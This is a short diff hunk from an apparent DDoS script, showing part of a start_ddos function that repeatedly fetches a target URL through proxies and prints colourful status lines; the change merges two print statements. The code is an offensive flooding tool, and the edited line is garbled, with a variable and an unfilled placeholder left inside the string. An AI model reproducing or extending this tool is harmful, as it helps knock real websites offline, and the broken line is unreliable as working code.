@@ -77,8 +77,7 @@ def start_ddos(prox, url, headers, proxies, color):
 		s = r.Session()
 		req = s.get(url, headers=headers, proxies=proxies)
 		if req.status_code == 200:
-			print(color+"💥 get: {} | \033[38;5;220mproxy ".format(prox))
-			print(f"\033[36m⚡{u} new proxies: {}".format(len(array))
+			print("\033[36m⚡{u} color+💥 get: {} \033[38;5;220mproxy ".format(prox))
 	except:
 		pass
 
